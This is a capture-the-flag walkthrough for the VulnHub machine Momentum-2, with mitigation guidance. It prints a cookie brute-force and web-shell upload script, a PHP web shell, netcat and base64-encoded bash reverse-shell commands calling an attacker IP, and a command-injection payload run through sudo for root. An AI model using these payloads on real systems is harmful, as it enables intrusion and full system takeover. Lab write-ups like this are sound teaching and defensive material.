# Momentum-2 CTF Walkthrough

**Target:** Momentum-2  
**Source:** [VulnHub](https://www.vulnhub.com/entry/momentum-2,702/)  
**Difficulty:** Medium  
**Target IP:** 10.0.2.251

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Application Analysis](#web-application-analysis)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Recommendations](#recommendations)

---

## Overview

Momentum-2 is a medium-difficulty CTF challenge that focuses on file upload bypass, cookie manipulation, and command injection vulnerabilities. The machine requires identifying authentication weaknesses, exploiting insecure file upload functionality, and leveraging sudo misconfigurations for privilege escalation.

**Key Skills Required:**
- Web application enumeration
- Source code analysis
- Cookie manipulation
- File upload bypass techniques
- Command injection exploitation
- Linux privilege escalation

---

## Reconnaissance

### Network Scanning

```bash
nmap -sS -sV -A -p- 10.0.2.251
```

**Results:**
- **Port 22/tcp:** OpenSSH 7.9p1 Debian 10+deb10u2
- **Port 80/tcp:** Apache/2.4.38 (Debian)

### Web Vulnerability Scanning

```bash
nikto -h http://10.0.2.251
```

**Key Findings:**
- Missing security headers (X-Frame-Options, X-Content-Type-Options)
- Directory indexing enabled on `/css/`, `/img/`, `/manual/images/`
- Apache version outdated
- ETag information disclosure

---

## Web Application Analysis

### Directory Enumeration

```bash
gobuster dir -u http://10.0.2.251/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x .php,.html,.js,.bak,.txt,.php.bak
```

**Critical Discoveries:**
- `/ajax.php.bak` - **Backup file containing source code** (Information Disclosure)
- `/dashboard.html` - File upload interface
- `/ajax.php` - File upload handler
- `/owls/` - Upload destination directory

### Source Code Analysis

#### File Upload Interface (`/dashboard.html`)

```html
<div>
    <input type="file" name="file" id="file">
    <input type="button" id="btn_uploadfile" value="Upload" onclick="uploadFile();">
</div>
<p class="footer">~ Upload Your Research File about Owls</p>
```

#### Upload Handler (`/js/main.js`)

```javascript
function uploadFile() {
    var files = document.getElementById("file").files;
    if(files.length > 0){
        var formData = new FormData();
        formData.append("file", files[0]);
        
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "ajax.php", true);
        
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                var response = this.responseText;
                if(response == 1){
                    alert("Upload successfully.");
                }else{
                    alert("File not uploaded.");
                }
            }
        };
        xhttp.send(formData);
    }
}
```

#### Backend Logic (`/ajax.php.bak`)

```php
<?php
    //The boss told me to add one more Upper Case letter at the end of the cookie
    if(isset($_COOKIE['admin']) && $_COOKIE['admin'] == '&G6u@B6uDXMq&Ms'){
        //[+] Add if $_POST['secure'] == 'val1d'
        $valid_ext = array("pdf","php","txt");
    }
    else{
        $valid_ext = array("txt");
    }
    
    // Remember success upload returns 1
?>
```

**Vulnerability Analysis:**
- Cookie-based authentication: `admin=&G6u@B6uDXMq&Ms[A-Z]`
- Only 26 possible values (brute-forceable in seconds)
- Additional POST parameter required: `secure=val1d`
- PHP file upload possible with valid cookie

---

## Exploitation

### Phase 1: Cookie Brute-Force

```python
import os
import requests

wordlist = 'letters.txt'

with open(wordlist, "r") as file:
   words = file.read().splitlines()

   for word in words:
      command = "curl -k -F 'file=@./shell.php' -F 'secure=val1d' --cookie 'admin=&G6u@B6uDXMq&Ms"+word + " " + "http://10.0.2.251/ajax.php"
      os.system(command)
      print(command)

   if "1" in command:
      print("[*] Shell Uploaded!")
      for execute in command:
          execute_command = input("[!] Command to Execute: ")
          get_rce = requests.get('http://10.0.2.251/owls/shell.php?cmd='+execute_command)
          print(str(get_rce.content))

          if execute_command == "clear":
             os.system("clear")

   else:
      print("[!] Shell not Uploaded!")
```

**Result:** Correct cookie is `admin=&G6u@B6uDXMq&MsR`

### Phase 2: PHP Web Shell Upload

Create simple web shell:

```php
<?php
echo system($_REQUEST['cmd']);
?>
```

**Web shell accessible at:** `http://10.0.2.251/owls/shell.php?cmd=COMMAND`

### Phase 3: Reverse Shell

Setup listener:

```bash
nc -nvlp 9001
```

Execute reverse shell via web shell:

```bash
# URL: http://10.0.2.251/owls/shell.php?cmd=nc 10.0.2.6 9001 -e /bin/bash
```

Stabilize shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Result:** Shell established as `www-data` user

---

## Post-Exploitation

### System Enumeration

```bash
www-data@momentum2:/$ cd /home
www-data@momentum2:/home$ ls
athena  team-tasks
```

### User Flag Discovery

```bash
www-data@momentum2:/home/athena$ cat user.txt
/                         \
~ Momentum 2 ~ User Owned ~
\                         /

---------------------------------------------------
FLAG : 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw
---------------------------------------------------
```

### Credential Discovery

```bash
www-data@momentum2:/home/athena$ cat password-reminder.txt
password : myvulnerableapp[Asterisk] -> myvulnerableapp* 
```

**Credentials:**
- Username: `athena`
- Password: `myvulnerableapp*`

### Lateral Movement via SSH

```bash
ssh athena@10.0.2.251
# Password: myvulnerableapp*
```

**Result:** SSH access as `athena` user

---

## Privilege Escalation

### Sudo Enumeration

```bash
athena@momentum2:~$ sudo -l
User athena may run the following commands on momentum2:
    (root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py
```

**Critical Finding:** Athena can run Python script as root without password

### Vulnerability Analysis

```bash
athena@momentum2:/home/team-tasks$ cat cookie-gen.py
```

```python
import random
import os
import subprocess

print('~ Random Cookie Generation ~')
print('[!] for security reasons we keep logs about cookie seeds.')
chars = '@#$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh'

seed = input("Enter the seed : ")
random.seed = seed

cookie = ''
for c in range(20):
    cookie += random.choice(chars)

print(cookie)

cmd = "echo %s >> log.txt" % seed
subprocess.Popen(cmd, shell=True)  # VULNERABLE LINE
```

**Command Injection Vulnerability:**
- User input (`seed`) directly interpolated into shell command
- `subprocess.Popen` with `shell=True` executes via `/bin/sh`
- No input sanitization
- Arbitrary command execution possible

### Exploitation

Prepare payload:

```bash
# Reverse shell payload
bash -i >& /dev/tcp/10.0.2.6/4242 0>&1

# Base64 encode to avoid special characters
echo "bash -i >& /dev/tcp/10.0.2.6/4242 0>&1" | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNi80MjQyIDA+JjEK
```

Setup listener:

```bash
nc -nvlp 4242
```

Execute exploit:

```bash
athena@momentum2:/home/team-tasks$ sudo -u root /usr/bin/python3 /home/team-tasks/cookie-gen.py
~ Random Cookie Generation ~
[!] for security reasons we keep logs about cookie seeds.
Enter the seed : `echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNi80MjQyIDA+JjEK" | base64 -d | bash`
```

**Exploit Breakdown:**
1. Backticks enable command substitution
2. Echo outputs base64 payload
3. `base64 -d` decodes the payload
4. Bash executes reverse shell
5. All commands run as root (via sudo)

### Root Access Achieved

```bash
nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.0.2.6] from (UNKNOWN) [10.0.2.251] 48528

whoami
root

id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```bash
root@momentum2:~# cat /root/root.txt
//                    \\
}  Rooted - Momentum 2 {
\\                    //

---------------------------------------------------
FLAG : 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
---------------------------------------------------

by Alienum with <3
```

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User | `4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw` | `/home/athena/user.txt` |
| Root | `4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Information Disclosure - Backup Files (High)

**Description:** Backup file `ajax.php.bak` exposed complete source code including authentication logic.

**Impact:** Revealed cookie-based authentication mechanism and file upload validation logic.

**Mitigation:**
- Remove all backup files from production servers
- Configure web server to block access to `.bak`, `.old`, `.tmp` files
- Implement proper version control instead of file-based backups

### 2. Weak Authentication Mechanism (High)

**Description:** Cookie value predictable with only 26 possibilities (`&G6u@B6uDXMq&Ms[A-Z]`).

**Impact:** Authentication bypass via brute-force attack in seconds.

**Mitigation:**
- Use cryptographically secure random tokens (UUID, JWT)
- Implement proper session management frameworks
- Add rate limiting on authentication attempts
- Use HttpOnly, Secure, and SameSite cookie flags

### 3. Insecure File Upload (Critical)

**Description:** PHP file upload without proper content validation, only extension checking.

**Impact:** Remote code execution via web shell upload.

**Mitigation:**
- Validate file content (magic numbers), not just extensions
- Store uploads outside web root
- Use randomized filenames
- Disable script execution in upload directories
- Implement antivirus scanning

**Example secure configuration:**

```apache
<Directory /var/www/html/uploads>
    php_flag engine off
    Options -ExecCGI
    AddHandler cgi-script .php .pl .py .jsp .asp .sh .cgi
</Directory>
```

### 4. Plaintext Credential Storage (Medium)

**Description:** SSH password stored in readable text file `password-reminder.txt`.

**Impact:** Lateral movement from `www-data` to `athena` user.

**Mitigation:**
- Never store passwords in plaintext
- Use password managers or encrypted vaults
- Implement proper secrets management (HashiCorp Vault, AWS Secrets Manager)

### 5. Command Injection (Critical)

**Description:** Unsanitized user input in `subprocess.Popen` with `shell=True`.

**Vulnerable Code:**
```python
cmd = "echo %s >> log.txt" % seed
subprocess.Popen(cmd, shell=True)
```

**Impact:** Arbitrary command execution with root privileges.

**Mitigation:**

**Insecure approach:**
```python
# INSECURE - Never do this!
cmd = "echo %s >> log.txt" % user_input
subprocess.Popen(cmd, shell=True)
```

**Secure approach:**
```python
# SECURE - Use file operations directly
with open('log.txt', 'a') as f:
    f.write(user_input + '\n')

# Or if subprocess is necessary
subprocess.run(['echo', user_input], 
               stdout=open('log.txt', 'a'),
               shell=False)
```

### 6. Sudo Misconfiguration (Critical)

**Description:** `NOPASSWD` sudo for script with command injection vulnerability.

**Configuration:**
```
athena ALL=(root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py
```

**Impact:** Direct privilege escalation to root.

**Mitigation:**
- Remove `NOPASSWD` from production systems
- Never combine `NOPASSWD` with scripts accepting user input
- Use specific, hardened commands only
- Implement sudoers with minimal required privileges

**Example secure configuration:**
```
# Instead of allowing script execution
athena ALL=(root) /usr/bin/specific_binary --fixed-args
```

### 7. Missing Input Validation (High)

**Description:** No validation on user-supplied seed value in `cookie-gen.py`.

**Impact:** Enabled command injection attack.

**Mitigation:**
- Implement strict input validation and sanitization
- Whitelist acceptable characters
- Reject special characters in security-sensitive inputs
- Use safe APIs that don't invoke shell

---

## Recommendations

### Web Application Security

**File Upload Protection:**
- Validate file content using magic numbers
- Store uploads outside web root
- Use Content-Disposition: attachment for downloads
- Implement file size limits
- Scan uploads with antivirus/malware detection
- Use randomized, non-guessable filenames

**Authentication & Session Management:**
- Use cryptographically secure random tokens
- Implement JWT or secure session frameworks
- Set proper cookie flags: HttpOnly, Secure, SameSite
- Implement rate limiting
- Log all authentication events
- Use multi-factor authentication

**Source Code Protection:**
- Remove all backup files from production
- Configure web server to deny backup extensions:

```apache
<FilesMatch "\.(bak|old|tmp|backup|swp)$">
    Require all denied
</FilesMatch>
```

### Input Validation & Command Execution

**Secure Subprocess Usage:**

```python
# AVOID shell=True with user input
subprocess.run(['command', arg1, arg2], shell=False)

# For complex commands, sanitize input
import shlex
safe_input = shlex.quote(user_input)
```

**Input Validation:**
- Whitelist acceptable characters
- Validate against expected patterns (regex)
- Reject instead of sanitize when possible
- Use type checking and bounds validation

### Credential Management

- Never store passwords in plaintext
- Use strong hashing algorithms (bcrypt, Argon2, scrypt)
- Implement proper secrets management solutions
- Use SSH keys instead of passwords
- Rotate credentials regularly
- Enforce strong password policies

### Privilege Management

**Secure Sudo Configuration:**

```bash
# Audit current sudo permissions
sudo -l

# Implement least privilege
user ALL=(root) /specific/command --with-fixed-args

# Avoid NOPASSWD in production
# If necessary, use for specific, safe commands only
```

### System Hardening

- Keep all software updated
- Disable directory indexing
- Remove unused services
- Implement firewall rules
- Enable SELinux or AppArmor
- Regular security audits

**Apache Security Headers:**

```apache
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```

### Monitoring & Logging

- Enable comprehensive logging
- Monitor for suspicious activities:
  - Failed authentication attempts
  - Unusual sudo usage
  - File upload activities
  - Command execution patterns
- Implement SIEM for log aggregation
- Set up real-time alerts
- Regular log reviews

---

## Attack Chain Summary

```
Port Scan (Nmap)
    ↓
Web Enumeration (Gobuster)
    ↓
Backup File Discovery (ajax.php.bak)
    ↓
Source Code Analysis
    ↓
Cookie Brute-Force (A-Z)
    ↓
Authentication Bypass
    ↓
PHP Web Shell Upload
    ↓
Reverse Shell Execution
    ↓
Initial Access (www-data)
    ↓
System Enumeration
    ↓
Credential Discovery (password-reminder.txt)
    ↓
Lateral Movement (SSH as athena)
    ↓
User Flag Capture
    ↓
Sudo Enumeration
    ↓
Command Injection Vulnerability Analysis
    ↓
Root Privilege Escalation
    ↓
Root Flag Capture
    ↓
Complete System Compromise
```

---

## Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.98 | Network scanning |
| Nikto | 2.5.0 | Web vulnerability scanning |
| Gobuster | 3.6 | Directory enumeration |
| curl | - | HTTP client |
| Python 3 | - | Exploit development |
| Netcat | - | Reverse shell listener |
| SSH | - | Lateral movement |

---

## References

- [VulnHub - Momentum-2](https://www.vulnhub.com/entry/momentum-2,702/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP File Upload Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-78: Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Python subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [GTFOBins - Sudo](https://gtfobins.github.io/gtfobins/sudo/)

---

## Disclaimer

This writeup is for **educational purposes only**. All techniques demonstrated should only be used on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

---
*"The best defense is understanding the attack."*
